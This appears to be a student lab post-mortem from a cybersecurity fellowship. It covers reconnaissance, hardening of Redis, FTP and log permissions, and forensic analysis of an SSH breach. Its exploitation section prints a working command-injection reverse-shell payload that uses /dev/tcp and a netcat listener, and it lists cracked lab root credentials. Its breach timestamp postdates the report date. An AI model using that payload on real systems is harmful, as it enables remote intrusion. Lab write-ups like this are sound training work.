# Phase 1 Final Reckoning — TEPP Post-Mortem
**Operator:** Christopher Diaz
**Date:** May 28, 2026
**Repository:** https://github.com/chris12x1/TKH-Phase1
**TKH Innovation Fellowship 2026 | Phase 1 | Cybersecurity**

---

## Phase 0: Reconnaissance

### Triage Network — 172.100.0.0/24
Active network reconnaissance of the Triage Network (172.100.0.0/24) identified three live targets requiring immediate configuration hardening. Host 172.100.0.11 exposed an active Redis key-value store instance on port 6379/tcp that lacked basic authentication requirements. Host 172.100.0.12 exposed a rogue, legacy File Transfer Protocol (FTP) daemon on port 21/tcp running an unhardened vsftpd service. Finally, host 172.100.0.13 did not broadcast open listening ports but harbored critical local directory misconfigurations, including an absolute permissions leakage on vital system auditing directories.

### Breach Network — 172.80.0.0/24
Active scanning across the Breach Network segment (172.80.0.0/24) confirmed the presence of a single operational endpoint located at 172.80.0.10. A comprehensive full-port service sweep revealed an exposed Secure Shell (SSH) daemon actively hosting an open connection surface on port 22/tcp. Initial connection behaviors and banner auditing indicated that the host implemented custom rate-limiting defensive controls via source penalties. This observation directly informed the Phase 2 forensic approach, prompting a pivot away from aggressive online brute-force scanning toward an analysis of the pre-staged server side authentication telemetry.

### Exploitation Network — 172.60.0.0/24
Active network reconnaissance of the Exploitation Network (172.60.0.0/24) successfully mapped two active hosts, comprising the infrastructure interface at 172.60.0.1 and a targeted application server at 172.60.0.10. A comprehensive full-port service scan of host 172.60.0.10 revealed an open HTTP daemon on port 80/tcp executing an unhardened Python-based BaseHTTPServer version 0.6 environment. Prior to exploitation, the implementation of this developmental HTTP server indicates a heightened probability of flawed input handling routines within the web application layer. This architectural pattern strongly implies a critical command injection vulnerability, where malicious string patterns can bypass input validation mechanisms to interact directly with the underlying system shell, thereby establishing an entry point for arbitrary remote code execution and subsequent reverse shell delivery.

---

## Phase 1: Rapid Triage

### Server 1 — 172.100.0.11
**Vulnerability Identified:**
An unauthenticated remote data exposure and configuration manipulation vulnerability was identified on the standard Redis port (6379/tcp). The exposure was verified by executing `redis-cli -h 172.100.0.11` from an external host, which successfully connected to the data store and processed core administrative directives without prompting for an administrative password or authorization token.

**Remediation Commands:**
sudo docker ps
sudo docker exec -it de874d9ba40d /bin/sh
mkdir -p /usr/local/etc/redis/
echo "requirepass SuperSecurePassword2026!" >> /usr/local/etc/redis/redis.conf
echo "bind 127.0.0.1" >> /usr/local/etc/redis/redis.conf
exit
sudo docker restart de874d9ba40d

**Before State:**
The Redis key-value store was bound to all network interfaces (0.0.0.0) and had no password requirement active. An external network entity could issue unauthenticated commands, sample database keys in plaintext, and potentially alter database runtime configurations to establish conditions for file overwrites or unauthorized execution.

**After State:**
The Redis daemon was hardened to enforce strong cryptographic authentication via the requirepass directive and restricted to processing transactions solely on the local loopback interface (127.0.0.1). Subsequent remote connection attempts from the external host result in immediate connection drops or an explicit (error) NOAUTH Authentication required restriction message.

**Analysis:**
Exposing an unauthenticated, in-memory data store directly to an untrusted network infrastructure introduces critical operational risks to organizational data confidentiality and underlying system integrity. Malicious threat actors who gain access to an open Redis instance can rapidly exfiltrate sensitive application data, manipulate critical parameters, or leverage database configuration mechanics to execute arbitrary commands at the operating system level. Consequently, isolating data layers through local loopback binding and enforcing robust access control schemes are essential perimeter-defense strategies necessary to prevent lateral movement and severe system compromise.

### Server 2 — 172.100.0.12
**Vulnerability Identified:**
An unauthorized File Transfer Protocol (FTP) service was found running on the network boundary. The exposure was confirmed via network-layer reconnaissance, which revealed that port 21/tcp was actively hosting a vsftpd daemon capable of intercepting and processing connection requests from external network hosts.

**Remediation Commands:**
sudo docker exec -it broken_server_2 /bin/sh
mv /etc/vsftpd/vsftpd.conf /etc/vsftpd/vsftpd.conf.bak
pkill vsftpd
exit
sudo docker restart broken_server_2

**Before State:**
The vsftpd process was actively executing inside the broken_server_2 container, maintaining an open socket listening on port 21/tcp across the network interface. The endpoint responded directly to inbound FTP connection handshakes, presenting a clear administrative attack surface and returning an access denied state upon remote connection attempts.

**After State:**
The internal vsftpd.conf configuration binary mapping was disabled, and the executing daemon process threads were terminated natively via a process kill signal inside the container environment. Subsequent remote connection probes targeting port 21/tcp result in an immediate network timeout or connection refusal, confirming the network-layer service is no longer operational.

**Analysis:**
The presence of an unapproved and unmonitored FTP service within an enterprise network architecture introduces critical security exposures, primarily because the legacy FTP standard transmits user authentication credentials and data payloads across the wire in cleartext format. Malicious actors positioned on the local segment can easily capture these credentials via packet-sniffing mechanisms, leading to widespread credential compromise and unauthorized lateral movement. Furthermore, rogue data ingestion pathways circumvent corporate security monitoring, allowing attackers to introduce unauthorized tools or malicious binaries into the enterprise environment undetected.

### Server 3 — 172.100.0.13
**Vulnerability Identified:**
A critical local access control misconfiguration was identified on the system logging file structure. Local auditing inside the container environment confirmed that the /var/log system directory was assigned unsafe, world-writable access permissions, exposing it to manipulation by unauthorized or unprivileged local accounts.

**Remediation Commands:**
sudo docker exec -it broken_server_3 /bin/sh
chmod 755 /var/log
ls -ld /var/log
exit

**Before State:**
The /var/log directory displayed a permission notation of drwxrwxrwx (POSIX absolute mode 777). This state allowed any local system process or unprivileged user account to read, write, append, or delete critical operating system logs and logging facilities.

**After State:**
The directory was hardened to a secure production standard of drwxr-xr-x (POSIX absolute mode 755). Under this state, administrative write access is restricted exclusively to the root user account, while system services retain necessary read and directory traversal privileges.

**Analysis:**
Maintaining world-writable permissions on administrative system structures like /var/log introduces severe operational risks to an enterprise infrastructure's audit integrity and security monitoring capabilities. Malicious actors or compromised low-privilege service accounts can exploit this misconfiguration to tamper with, cover up, or completely purge log entries, effectively blinding security operations center (SOC) analysts during an incident response investigation. Furthermore, the ability to manipulate directory structures allows attackers to plant malicious symbolic links or inject arbitrary text payloads into log streams, creating subsequent vectors for privilege escalation or log-parser exploitation.

---

## Phase 2: The Breach

**Cracked Credentials:**
- Username: root
- Password: admin123

**Forensic Evidence:**
- Exact Timestamp of Successful Login: 2026-06-01 01:32:14 UTC (Verified via live internal log auditing)
- Attacker IP Address: 172.80.0.1

**Engineered iptables Rule:**
sudo iptables -A INPUT -s 172.80.0.1 -j DROP

**SOC Analysis:**
Utilizing a standalone iptables perimeter block rule is fundamentally insufficient as a comprehensive defensive measure because network-layer blocks only mitigate a static source vector, allowing adaptive threat actors to easily bypass the restriction by rotating public IP addresses or leveraging proxy infrastructures. To establish a resilient defensive posture, a mature Security Operations Center (SOC) must implement a layered defense-in-depth framework alongside network restrictions. This architecture should incorporate multi-factor authentication (MFA) for all cryptographic entry points, public-key-only authentication to eliminate brute-force exposure, and host-based intrusion prevention systems (HIPS) such as Fail2ban to automate real-time IP shunning.

---

## Phase 3: Full Spectrum

**Listener Configuration:**
The network utility Netcat (nc) was used to establish a local listening socket on port 4444. The utility was executed via the terminal utilizing the parameters nc -lvnp 4444 to enable verbose monitoring, suppress DNS resolution, and bind exclusively to the specified local network interface port.

**Reverse Shell Payload:**
curl "[http://172.60.0.10/?ip=127.0.0.1;bash](http://172.60.0.10/?ip=127.0.0.1;bash) -i >& /dev/tcp/172.60.0.1/4444 0>&1"

**Command Injection Explanation:**
Command injection vulnerabilities manifest when an application incorporates raw, unsanitized user-supplied inputs directly into an administrative operating system shell execution engine. The target application is inherently susceptible to this flaw because its unhardened Python backend processes web-form parameters utilizing dangerous functions, such as os.system or subprocess.Popen with shell settings enabled, without implementing strict input filtering or character whitelisting. By appending POSIX shell metacharacters like semicolons or pipes, an external operator can successfully break out of the intended software context to execute arbitrary platform binaries under the security context of the web runtime worker.

**Forensic Evidence:**
- Process ID (PID): 1
- User-Agent: unknown

**Lockdown Command:**
sudo iptables -A INPUT -p tcp --dport 80 -j DROP

**Final Analytical Paragraph:**
Analyzing both the offensive execution and defensive remediation of this system compromise demonstrates that a reliance on reactive host-based blocking measures cannot substitute for robust, secure-by-design architectural principles. Playing both operational roles emphasizes that perimeter firewalls fail to safeguard infrastructure when the software applications they publish possess systemic logic flaws capable of facilitating remote code execution. If a comprehensive input validation mechanism or an enforced principle of least privilege had been implemented within the application layout prior to the deployment phase, this breach would have been neutralized entirely. Restricting the application's system access token to low-privilege accounts and sanitizing inputs via a strict alphanumeric whitelist effectively strips out the shell metacharacters necessary to chain arbitrary operating system commands, securing the runtime boundary regardless of the network visibility status.

---

## References
Docker Project. (2026). Docker engine command line interface documentation. https://docs.docker.com/engine/reference/commandline/cli/
Nmap Project. (2026). Network mapper (Nmap) reference guide. https://nmap.org/book/man.html
Redis Project. (2026). Redis security guide and configuration parameters. https://redis.io/docs/management/security/
Hydra Project. (2023). THC-Hydra: A fast and flexible online password cracking tool. https://github.com/vanhauser-thc/thc-hydra
